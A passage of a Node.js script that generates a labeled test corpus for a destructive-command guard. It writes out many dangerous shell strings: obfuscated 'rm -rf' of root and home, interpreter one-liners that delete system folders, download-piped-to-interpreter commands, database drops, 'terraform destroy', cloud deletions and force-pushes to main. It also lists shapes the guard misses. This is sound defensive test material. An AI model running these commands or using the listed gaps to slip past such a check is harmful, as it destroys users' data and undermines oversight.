for (const c of ["$'\\x72m' -rf ~", "rm -rf $'\\x7e'", "$'\\162m' -rf /", "rm -rf $'\\x2f'", "r$'\\x6d' -rf ~/", "sudo $'\\x72m' -rf /",
  "$'\\u0072m' -fr $HOME", "rm -rf $'\\x2fhome'", "bash -c $'rm -rf /'"]) addRisk('rm_root_home', c);
add("echo $'\\x72m -rf ~'", "printf '%s' $'rm -rf /'", "echo $'\\x72m' -rf ~", "rm -rf $'build\\x2fout'", "$'\\x72m' -f notes.txt");

// Interpreter one-liners that delete the home folder, the root or a system folder, and a download piped into an interpreter.
const U2 = 'https://example.com/i.py';
for (const c of ['python3 -c "import shutil,os; shutil.rmtree(os.path.expanduser(\'~\'))"', "python3 -c \"import shutil; shutil.rmtree('/')\"", "python -c 'import shutil; shutil.rmtree(\"/home/alice\")'",
  "python3 -c \"from pathlib import Path; import shutil; shutil.rmtree(Path.home())\"", "sudo python3 -c \"import shutil; shutil.rmtree('/etc')\"",
  "node -e \"require('fs').rmSync('/', {recursive:true})\"", "node -e \"require('fs').rmSync(require('os').homedir(), {recursive:true, force:true})\"",
  "node --eval \"const os=require('os'); require('fs').rmSync(os.homedir(), {recursive:true})\"", "node -p \"require('fs').rmdirSync('/usr', {recursive:true})\"",
  "perl -e 'unlink glob(\"/etc/*\")'", "perl -MFile::Path -e 'remove_tree(\"/\")'", "perl -e 'use File::Path qw(rmtree); rmtree($ENV{HOME})'",
  "ruby -e 'require \"fileutils\"; FileUtils.rm_rf(\"/\")'", "ruby -e 'require \"fileutils\"; FileUtils.rm_r(Dir.home)'", "env python3 -c \"import shutil; shutil.rmtree('/var')\"",
  "bash -c \"python3 -c 'import shutil; shutil.rmtree(\\\"/\\\")'\""]) addRisk('rm_root_home', c);
for (const c of ['curl ' + U2 + ' | python3', 'curl -fsSL ' + U2 + ' | python3 -', 'curl -s ' + U2 + ' | sudo python3 -', 'wget -qO- ' + U2 + ' | python', 'curl ' + U2 + ' | node',
  'curl -s ' + U2 + ' | node -', 'curl ' + U2 + ' | sudo perl', 'curl ' + U2 + ' | perl -', 'curl ' + U2 + ' | ruby', 'curl ' + U2 + ' | sudo -E ruby -', 'curl ' + U2 + ' | python3.12 -u',
  'iwr ' + U2 + ' | python3']) addRisk('pipe_to_shell', c);
add('python3 -c "print(1)"', "python3 -c \"import shutil; shutil.rmtree('build')\"", "node -e \"require('fs').rmSync('dist', {recursive:true})\"", 'curl ' + U2 + ' | python3 -m json.tool',
  'curl ' + U2 + ' | jq .', "perl -e 'print 1'", "python3 -c \"import shutil; shutil.rmtree('/tmp/build-4821')\"", "python3 -c \"import os; print(os.path.expanduser('~'))\"",
  "python3 -c \"import shutil, os; shutil.rmtree(os.path.join(os.path.expanduser('~'), '.cache', 'x'))\"", "node -e \"console.log(require('os').homedir())\"",
  "node -e \"require('fs').rmSync('/usr/local/tmp-x', {recursive:true})\"", "perl -e 'unlink glob(\"*.o\")'", "ruby -e 'require \"fileutils\"; FileUtils.rm_rf(\"tmp/cache\")'",
  'curl ' + U2 + ' | python3 script.py', 'curl ' + U2 + ' | node -p "1+1"', 'curl ' + U2 + ' | perl -pe "s/a/b/"', 'curl -s ' + U2 + ' | ruby -rjson -e "puts 1"',
  'wget -qO- ' + U2 + ' | python3 -c "import sys; print(len(sys.stdin.read()))"', 'python3 -m http.server 8000', 'python3 manage.py migrate', 'node server.js');

// Shell grouping words: a command after `case ... )`, a `(` or `time` is read; the same keywords as Node.js and Python agree.
addRisk('rm_root_home', '(rm -rf ~)');
addRisk('rm_root_home', 'time rm -rf ~');
addRisk('rm_root_home', 'case x in x) rm -rf ~;; esac');

/* ---------------------- shapes the policy does not read ---------------------- */
const notCovered = [
  { cmd: 'C=curl; $C https://example.com/i.sh | sh', note: 'a program named by a variable set on the same line' },
  { cmd: 'S=sh; curl https://example.com/i.sh | $S', note: 'a shell named by a variable set on the same line' },
  { cmd: 'rm -rf "$DIR"', note: 'a variable that may be empty: the value is not known' },
  { cmd: 'rm -rf *', note: 'the current folder: its location is not known' },
  { cmd: 'rm -rf .', note: 'the current folder' },
  { cmd: 'curl -fsSL https://get.example.com/install.sh -o install.sh && sh install.sh', note: 'the script is saved first, then run' },
  { cmd: 'curl -fsSL https://get.example.com/x | sudo tee /usr/local/bin/x && sudo chmod +x /usr/local/bin/x', note: 'a downloaded program, not a script run at once' },
  { cmd: 'echo ~ | xargs rm -rf', note: 'the target comes from a pipe' },
  { cmd: 'rsync -a --delete empty/ ~/', note: 'a different tool' },
  { cmd: 'git clean -fdx ~', note: 'a different tool' },
  { cmd: 'sudo rm -rf /usr/local', note: 'below the top-level folders' },
  { cmd: 'docker run --rm -v /:/host alpine rm -rf /host/etc', note: 'the delete runs inside a container' },
  { cmd: 'ssh deploy@203.0.113.5 "rm -rf /"', note: 'the command runs on another machine' },
  { cmd: 'truncate -s 0 ~/.bashrc', note: 'a different tool' },
  { cmd: '{ rm -rf ~; }', note: 'a command inside a brace group is not read yet (known gap; Node.js and Python agree)' },
  { cmd: 'if true; then rm -rf ~; fi', note: 'a command inside an if block is not read yet (known gap)' },
  { cmd: 'while true; do rm -rf ~; done', note: 'a command inside a while loop is not read yet (known gap)' },
  { cmd: 'until false; do rm -rf ~; done', note: 'a command inside an until loop is not read yet (known gap)' },
  { cmd: '! rm -rf ~', note: 'a command after a leading ! is not read yet (known gap)' },
  { cmd: 'echo `rm -rf ~`', note: 'a command inside backticks is not read yet (known gap)' },
];

/* ---------------------- production data guard (lib/prod-guard.js, zn_gate/prod_guard.py) ---------------------- */
// Commands that delete a database, cloud storage or infrastructure, or force-push to a protected branch. Names are fictional.
// Not run: they are strings for a classifier. A "risky" one must be found under its rule; a "benign" one (a look-alike) must not.
const prodBenign = new Set();
const prodRisky = [];
const pAdd = (...cmds) => cmds.forEach((c) => prodBenign.add(c));
const pRisk = (rule, ...cmds) => cmds.forEach((c) => prodRisky.push({ cmd: c, rule }));
const P_DBS = ['prod-db-example', 'orders_example', 'app_example', 'analytics-example', 'billing_example'];
const P_TABLES = ['users', 'orders', 'public.events', 'audit_log', 'sessions'];
const P_PREFIX = ['', '', 'sudo ', 'env PGPASSWORD=example ', 'time ', 'cd /srv/app && '];
const P_HOSTS = ['db.example.com', 'db.example.test', '192.0.2.10', '198.51.100.7', '203.0.113.5'];

// SQL clients: -c, -e, an argument, a here-document, a here-string, a pipe.
for (const db of P_DBS) {
  const h = pick(P_HOSTS);
  pRisk('sql_drop',
    pick(P_PREFIX) + 'psql -h ' + h + ' -U app -c "DROP DATABASE ' + db + '"',
    pick(P_PREFIX) + 'psql -d ' + db + " -c 'drop table " + pick(P_TABLES) + ";'",
    pick(P_PREFIX) + 'psql ' + db + ' -Atc "TRUNCATE TABLE ' + pick(P_TABLES) + '"',
    pick(P_PREFIX) + 'psql --command="DROP SCHEMA public CASCADE" ' + db,
    pick(P_PREFIX) + 'mysql -h ' + h + ' -u root -e "DROP DATABASE ' + db + '"',
    pick(P_PREFIX) + 'mysql -uroot --execute="TRUNCATE ' + pick(P_TABLES) + '" ' + db,
    pick(P_PREFIX) + 'mariadb -e "drop table if exists ' + pick(P_TABLES) + '" ' + db,
    pick(P_PREFIX) + 'sqlite3 ' + db + '.sqlite "DROP TABLE ' + pick(P_TABLES) + ';"',
    pick(P_PREFIX) + 'sqlcmd -S ' + h + ' -Q "DROP DATABASE ' + db + '"',
    pick(P_PREFIX) + 'clickhouse-client --query "TRUNCATE TABLE ' + pick(P_TABLES) + '"',
    pick(P_PREFIX) + 'mongosh "mongodb://' + h + '/' + db + '" --eval "db.dropDatabase()"',
    pick(P_PREFIX) + "mongosh --eval 'db." + pick(['users', 'orders', 'events']) + ".drop()' " + db,
    pick(P_PREFIX) + 'psql ' + db + ' <<< "DROP TABLE ' + pick(P_TABLES) + ';"',
    'echo "DROP DATABASE ' + db + ';" | psql ' + db,
    "printf 'TRUNCATE TABLE " + pick(P_TABLES) + ";' | mysql " + db,
    'psql ' + db + ' <<EOF\nBEGIN;\nDROP TABLE ' + pick(P_TABLES) + ';\nCOMMIT;\nEOF',
    'psql ' + db + " <<'SQL'\nTRUNCATE " + pick(P_TABLES) + ";\nSQL",
    'mysql ' + db + ' <<-EOT\n\tDROP DATABASE ' + db + ';\nEOT',
    'cat <<EOF | psql ' + db + '\nDROP TABLE ' + pick(P_TABLES) + ';\nEOF',
    'sqlite3 ' + db + '.sqlite <<EOF\n-- clean up\nDROP TABLE ' + pick(P_TABLES) + ';\nEOF',
    "sudo bash -c 'psql -c \"DROP DATABASE " + db + "\"'",
    'bash -c "mysql -e \'TRUNCATE ' + pick(P_TABLES) + "'\"",
    'mongosh <<EOF\nuse ' + db + '\ndb.dropDatabase()\nEOF');
}

// terraform, tofu, terragrunt.
for (const dir of ['', ' -chdir=infra', ' -chdir=envs/prod-example']) {
  pRisk('terraform_destroy',
    'terraform' + dir + ' destroy', 'terraform' + dir + ' destroy -auto-approve', 'terraform' + dir + ' apply -destroy', 'terraform' + dir + ' apply -auto-approve -destroy',
    'terraform' + dir + ' apply --destroy', 'terraform' + dir + ' destroy -target=aws_db_instance.prod_db_example', 'tofu' + dir + ' destroy', 'tofu' + dir + ' apply -destroy',
    'sudo terraform' + dir + ' destroy -auto-approve', 'env TF_IN_AUTOMATION=1 terraform' + dir + ' destroy');
}
pRisk('terraform_destroy', 'terragrunt destroy', 'terragrunt run-all destroy', 'terragrunt apply -destroy', 'cd infra && terraform destroy -auto-approve',
  'bash -c "terraform destroy -auto-approve"', 'bash <<EOF\ncd infra\nterraform destroy\nEOF', 'terraform init && terraform destroy', '/usr/local/bin/terraform destroy');

// kubectl.
for (const ns of ['prod-example', 'payments-example', 'staging-example']) {
  pRisk('kubectl_delete_namespace',
    'kubectl delete namespace ' + ns, 'kubectl delete ns ' + ns, 'kubectl delete namespaces ' + ns + ' other-example', 'kubectl delete namespace/' + ns, 'kubectl --context prod-example delete namespace ' + ns,
    'kubectl -n ' + ns + ' delete namespace ' + ns, 'sudo kubectl delete ns ' + ns, 'oc delete namespace ' + ns, 'kubectl delete ns ' + ns + ' --wait=false');
  pRisk('kubectl_delete_all',
    'kubectl delete pods --all -n ' + ns, 'kubectl delete deployments --all --namespace=' + ns, 'kubectl -n ' + ns + ' delete pvc --all', 'kubectl delete all --all -n ' + ns,
    'kubectl delete pods,svc --all -n ' + ns, 'kubectl delete jobs --all=true -n ' + ns, 'kubectl --context prod-example delete statefulsets --all -n ' + ns, 'oc delete pods --all -n ' + ns);
}

// aws.
for (const b of ['example-bucket', 'prod-assets-example', 'logs-example']) {
  pRisk('aws_s3_delete',
    'aws s3 rm s3://' + b + ' --recursive', 'aws s3 rm s3://' + b + '/data/ --recursive', 'aws s3 rm --recursive s3://' + b, 'aws --profile prod-example s3 rm s3://' + b + ' --recursive',
    'aws s3 rm s3://' + b + ' --recursive --exclude "*" --include "tmp/*"', 'aws s3 rb s3://' + b, 'aws s3 rb s3://' + b + ' --force', 'aws s3api delete-bucket --bucket ' + b,
    'aws --region us-east-1 s3api delete-bucket --bucket ' + b, 'aws s3api delete-objects --bucket ' + b + ' --delete file://delete.json', 'sudo aws s3 rm s3://' + b + ' --recursive');
}
for (const id of ['prod-db-example', 'orders-example', 'analytics-example']) {
  pRisk('aws_rds_delete',
    'aws rds delete-db-instance --db-instance-identifier ' + id + ' --skip-final-snapshot', 'aws rds delete-db-cluster --db-cluster-identifier ' + id, 'aws rds delete-db-snapshot --db-snapshot-identifier ' + id,
    'aws --profile prod-example rds delete-db-instance --db-instance-identifier ' + id, 'aws rds delete-db-cluster-snapshot --db-cluster-snapshot-identifier ' + id,
    'aws rds delete-db-instance --db-instance-identifier ' + id + ' --final-db-snapshot-identifier ' + id + '-final');
}

// gcloud.
for (const n of ['prod-db-example', 'orders-example', 'example-project']) {
  pRisk('gcloud_delete',
    'gcloud projects delete ' + n, 'gcloud sql instances delete ' + n, 'gcloud sql instances delete ' + n + ' --quiet', 'gcloud sql databases delete ' + n + ' --instance=prod-db-example',
    'gcloud storage buckets delete gs://' + n, 'gcloud container clusters delete ' + n + ' --zone us-central1-a', 'gcloud --project example-project container clusters delete ' + n,
    'gcloud beta sql instances delete ' + n, 'gcloud --project=example-project sql instances delete ' + n, 'gcloud alpha storage buckets delete gs://' + n);
}

// git: a force push to main, master, release/* (explicit branch names; a push with no branch name needs the repository, see the tests).
for (const flag of ['--force', '-f', '--force-with-lease', '--force-with-lease=main', '--force-if-includes']) {
  for (const b of ['main', 'master', 'release/1.2', 'release/2.0.x']) {
    pRisk('git_force_push_protected',
      'git push ' + flag + ' origin ' + b, 'git push origin ' + b + ' ' + flag, 'git push ' + flag + ' origin HEAD:' + b, 'git push ' + flag + ' origin HEAD:refs/heads/' + b,
      'git push ' + flag + ' upstream feature-x:' + b, 'git -C /srv/app push ' + flag + ' origin ' + b, 'cd /srv/app && git push ' + flag + ' origin ' + b);
  }
}
pRisk('git_force_push_protected', 'git push origin +main', 'git push origin +HEAD:master', 'git push origin +release/3.1', 'git push -fu origin main', 'git push -uf origin master', 'git push --force --all',
  'git push --mirror --force origin', 'git push --mirror origin', 'git push origin --mirror', 'git push --mirror=origin', 'git push -v --mirror origin', 'git push --no-verify --mirror origin', 'git -C /srv/app push --mirror origin', 'git push --force origin feature-x main', 'git push --no-verify -f origin main', 'sudo git push -f origin main');

// git: deleting a protected branch on a remote (--delete, -d or an empty source before the colon).
for (const b of ['main', 'master', 'release/1.2', 'release/2.0.x']) {
  pRisk('git_delete_protected_branch',
    'git push origin --delete ' + b, 'git push --delete origin ' + b, 'git push origin -d ' + b, 'git push -d origin ' + b, 'git push origin :' + b,
    'git push origin :refs/heads/' + b, 'git push upstream --delete refs/heads/' + b, 'git push origin --delete feature-x ' + b, 'git push origin :feature-x :' + b,
    'git -C /srv/app push origin --delete ' + b, 'cd /srv/app && git push origin :' + b, 'sudo git push origin -d ' + b);
}

// Benign look-alikes: they must stay allowed.
pAdd("psql -c \"SELECT * FROM users WHERE name = 'DROP TABLE'\"", "psql -d prod-db-example -c \"SELECT 'TRUNCATE TABLE users'\"", 'psql -c "select 1"', 'psql -c "SELECT count(*) FROM orders"',
  'psql -c "-- DROP TABLE users\nSELECT 1"', 'psql -c "/* DROP DATABASE prod-db-example */ SELECT 1"', 'psql -c "SELECT truncate(1.5)"', 'mysql -e "SELECT TRUNCATE(3.14159, 2)"',
  'mysql -e "SHOW TABLES"', 'mysql -e "SELECT * FROM drop_events"', 'mysql -e "UPDATE t SET note = \'drop table later\' WHERE id = 1"', 'sqlite3 app.sqlite ".tables"', 'sqlite3 app.sqlite "SELECT * FROM users;"',
  'psql prod-db-example < dump.sql', 'psql -f schema.sql prod-db-example', 'psql -c "\\dt"', 'pg_dump prod-db-example > backup.sql', 'mongosh --eval "db.users.find()"', "mongosh --eval \"print('db.dropDatabase()')\"",
  'mongosh --eval "db.stats()"', 'echo "DROP TABLE users" > notes.txt', 'echo DROP TABLE users | grep TABLE', 'cat notes.txt | grep -i "drop table"', 'grep -rn "DROP TABLE" migrations/',
  'git commit -m "drop table users from the schema"', 'psql prod-db-example <<EOF\nSELECT * FROM users;\nEOF', "psql prod-db-example <<'SQL'\nSELECT count(*) FROM orders; -- no DROP TABLE here\nSQL",
  "mysql prod-db-example <<EOF\nSELECT 'TRUNCATE TABLE orders';\nEOF", 'cat <<EOF > notes.txt\nDROP TABLE users;\nEOF', 'cat <<EOF | psql prod-db-example\nSELECT 1;\nEOF', 'python3 -c "print(\'DROP TABLE users\')"',
  'terraform plan', 'terraform plan -destroy', 'terraform plan -destroy -out=tfplan', 'terraform apply', 'terraform apply -auto-approve', 'terraform apply tfplan', 'terraform init', 'terraform validate',
  'terraform fmt -check', 'terraform state list', 'terraform output', 'terraform workspace select staging-example', 'tofu plan -destroy', 'terragrunt plan', 'terragrunt run-all plan', 'echo terraform destroy',
  'git commit -m "document terraform destroy"', 'grep -rn "terraform destroy" docs/',
  'kubectl delete pod web-1', 'kubectl delete pod web-1 -n prod-example', 'kubectl delete deployment web -n staging-example', 'kubectl delete -f manifest.yaml', 'kubectl delete job migrate-1 --namespace=prod-example',
  'kubectl delete pods -l app=web -n staging-example', 'kubectl get namespaces', 'kubectl get ns', 'kubectl describe namespace prod-example', 'kubectl create namespace staging-example', 'kubectl get pods --all-namespaces',
  'kubectl get pods -A', 'kubectl delete secret example-secret -n staging-example', 'kubectl -n prod-example delete pod web-1', 'kubectl --context staging-example delete pod web-1', 'oc delete pod web-1', 'kubectl delete deployment namespace-controller -n staging-example',
  'aws s3 rm s3://example-bucket/file.txt', 'aws s3 rm s3://example-bucket/path/file.txt --quiet', 'aws s3 rm s3://example-bucket --recursive --dryrun', 'aws s3 ls', 'aws s3 ls s3://example-bucket --recursive',
  'aws s3 cp file.txt s3://example-bucket/', 'aws s3 sync ./dist s3://example-bucket/', 'aws s3 mb s3://example-bucket-new', 'aws s3api delete-object --bucket example-bucket --key file.txt', 'aws s3api list-objects-v2 --bucket example-bucket',
  'aws s3api head-bucket --bucket example-bucket', 'aws rds describe-db-instances', 'aws rds describe-db-instances --db-instance-identifier prod-db-example', 'aws rds create-db-snapshot --db-instance-identifier prod-db-example --db-snapshot-identifier snap-example',
  'aws rds modify-db-instance --db-instance-identifier prod-db-example --backup-retention-period 7', 'aws ec2 describe-instances', 'aws sts get-caller-identity', 'aws --profile prod-example s3 ls',
  'gcloud sql instances describe prod-db-example', 'gcloud sql instances list', 'gcloud projects describe example-project', 'gcloud projects list', 'gcloud storage buckets describe gs://example-bucket', 'gcloud storage buckets list',
  'gcloud container clusters describe orders-example --zone us-central1-a', 'gcloud container clusters get-credentials orders-example --zone us-central1-a', 'gcloud container clusters list', 'gcloud config set project example-project',
  'gcloud compute instances list', 'gcloud sql databases list --instance=prod-db-example', 'gcloud --project example-project sql instances describe prod-db-example',
  'git push --force origin feature/login', 'git push -f origin fix/typo', 'git push --force-with-lease origin my-branch', 'git push --force origin feature-x:feature-y', 'git push origin main', 'git push origin master', 'git push -u origin main',
  'git push origin release/1.2', 'git push', 'git push origin', 'git push --force-with-lease=feature:abc123 origin feature', 'git push origin +feature-x', 'git push -u origin feature/billing-example', 'git push origin --delete old-branch',
  'git push --tags', 'git push --force origin refs/heads/feature-z', 'git push --force origin HEAD:refs/heads/dev-example', 'git fetch --force origin main', 'git branch -f main origin/main', 'git checkout -f main', 'git pull --force origin main',
  'echo git push --force origin main', 'git commit -m "never git push --force origin main"', 'git log --oneline main', 'git push --dry-run origin main',
  'git push origin --delete feature-x', 'git push origin -d feature/login', 'git push origin :feature-x', 'git push origin --delete feature-x fix/typo', 'git push origin --delete tag-main',
  'git push origin --delete refs/tags/main', 'git push origin HEAD:main', 'git push origin --delete mainline', 'git push origin :release', 'git push origin --delete hotfix/release/1');

// Brace groups and subshells, oc delete project, gcloud storage rm -r, aws s3 sync --delete, xargs and watch.
pRisk('terraform_destroy', '{ terraform destroy; }', '{ terraform destroy -auto-approve; }', 'cd infra-example && { terraform destroy; }', '( terraform destroy )', '{ ( tofu destroy ); }', '{ { terraform apply -destroy; }; }',
  'xargs terraform destroy', 'watch terraform destroy', 'watch -n 5 terraform destroy', 'echo infra-example | xargs -n 1 terraform destroy');
pRisk('kubectl_delete_namespace', '( kubectl delete ns prod-example )', '{ kubectl delete namespace prod-example; }', 'true && { kubectl delete ns payments-example; } 2>&1', 'oc delete project example-prod', 'oc delete projects example-prod other-example',
  'oc delete project/example-prod', 'oc -n example-prod delete project example-prod', '{ oc delete project example-prod; }', 'echo prod-example | xargs kubectl delete namespace', 'echo prod-example | xargs -I{} kubectl delete ns {}');
pRisk('kubectl_delete_all', '{ kubectl delete pods --all -n prod-example; }', 'xargs kubectl delete pods --all');
pRisk('aws_s3_delete', '{ aws s3 rb s3://example-prod; }', 'aws s3 sync ./empty-example s3://example-prod --delete', 'aws s3 sync s3://example-a s3://example-prod --delete --exclude "*.log"', '{ aws s3 sync ./empty-example s3://example-prod --delete; }',
  'echo example-prod | xargs -I{} aws s3 rb s3://{}');
pRisk('gcloud_delete', 'gcloud storage rm -r gs://example-prod-bucket', 'gcloud storage rm --recursive gs://example-prod-bucket', 'gcloud storage rm -R gs://example-prod-bucket/data', 'gcloud storage rm gs://example-prod-bucket/data -r',
  'gcloud alpha storage rm -r gs://example-prod-bucket', '{ gcloud storage rm -r gs://example-prod-bucket; }', '( gcloud storage rm --recursive gs://example-prod-bucket )', 'gcloud --project example-project storage rm --recursive gs://example-prod-bucket');
pRisk('git_force_push_protected', '{ git push --force origin main; }', '( git push -f origin master )');
pRisk('sql_drop', '{ psql -c "DROP DATABASE prod-db-example"; }', '( mysql -e "DROP TABLE users" prod-db-example )');
pAdd('{ terraform plan; }', '{ terraform plan -destroy; }', '( kubectl get ns )', '{ kubectl delete pod web-1 -n prod-example; }', '( kubectl delete pod web-1 )', '{ echo terraform destroy; }', '{ git push origin feature-x; }',
  'oc get projects', 'oc project example-prod', 'oc new-project example-test', 'oc delete route web-example', 'xargs echo terraform destroy', 'watch kubectl get pods -n prod-example',
  'echo example-test | xargs kubectl get ns', 'echo example-test | xargs -I{} kubectl delete pod {}', 'echo a.log | xargs rm',
  'gcloud storage rm gs://example-prod-bucket/file.txt', 'gcloud storage ls -r gs://example-prod-bucket', 'gcloud storage cp -r ./out gs://example-prod-bucket', 'gcloud storage ls gs://example-prod-bucket',
  'aws s3 sync ./dist s3://example-prod-bucket', 'aws s3 sync ./dist s3://example-prod-bucket --delete --dryrun', 'aws s3 sync s3://example-a s3://example-b --exclude "*.log"', 'aws s3 sync ./dist s3://example-bucket/ --acl private',
  '{ echo done; }', '( cd infra-example && terraform plan )');

// Shapes the guard does not read (documented): it allows them.
const prodNotCovered = [
  { cmd: 'psql -f drop_all.sql prod-db-example', note: 'SQL in a file: the file is not read' },
  { cmd: 'psql prod-db-example < drop_all.sql', note: 'SQL in a file redirected to the client' },
  { cmd: 'python3 reset_db.py', note: 'a script or program: its code is not read' },
  { cmd: 'python3 -c "import psycopg2; psycopg2.connect(\'dbname=example\').cursor().execute(\'DROP TABLE users\')"', note: 'a database driver called from code' },
  { cmd: 'curl -X DELETE https://api.example.com/v1/projects/example-project -H "Authorization: Bearer example-token"', note: 'a REST call made with a token that was found' },
  { cmd: 'aws dynamodb delete-table --table-name example-table', note: 'a cloud command outside the listed ones' },
  { cmd: 'redis-cli FLUSHALL', note: 'a data store outside the listed ones' },
  { cmd: 'ssh deploy@203.0.113.5 "terraform destroy"', note: 'the command runs on another machine' },
  { cmd: 'kubectl delete pv example-pv', note: 'a kubectl delete outside namespaces and --all' },
  { cmd: 'DB_CMD=psql; $DB_CMD -c "DROP TABLE users"', note: 'a program named by a variable' },
  { cmd: 'git push', note: 'no branch named and the repository is not known to the check' },
  { cmd: 'gsutil rm -r gs://example-bucket', note: 'a cloud command outside the listed ones' },
  { cmd: 'if true; then terraform destroy; fi', note: 'the body of an if, while or for on one line is not read' },
  { cmd: 'gcloud storage rm gs://example-prod-bucket/**', note: 'a wildcard that empties a bucket without -r' },
];

const out = {
  note: 'Labeled command strings for the destructive-command policy tests. Never run them. Rewrite with: node test/fixtures/make_destructive_corpus.js',
  benign: Array.from(benign).sort(),
  risky: risky.sort((a, b) => (a.rule + a.cmd < b.rule + b.cmd ? -1 : 1)),
  not_covered: notCovered,
  prod_benign: Array.from(prodBenign).sort(),
  prod_risky: prodRisky.sort((a, b) => (a.rule + a.cmd < b.rule + b.cmd ? -1 : 1)),
  prod_not_covered: prodNotCovered,
};
fs.writeFileSync(path.join(__dirname, 'destructive_commands.json'), JSON.stringify(out, null, 1) + '\n');
const byRule = {};
for (const r of out.risky) byRule[r.rule] = (byRule[r.rule] || 0) + 1;
const prodByRule = {};
for (const r of out.prod_risky) prodByRule[r.rule] = (prodByRule[r.rule] || 0) + 1;
console.log('prod_benign', out.prod_benign.length, 'prod_risky', out.prod_risky.length, JSON.stringify(prodByRule), 'prod_not_covered', out.prod_not_covered.length);
console.log('benign', out.benign.length, 'risky', out.risky.length, JSON.stringify(byRule), 'not_covered', out.not_covered.length);
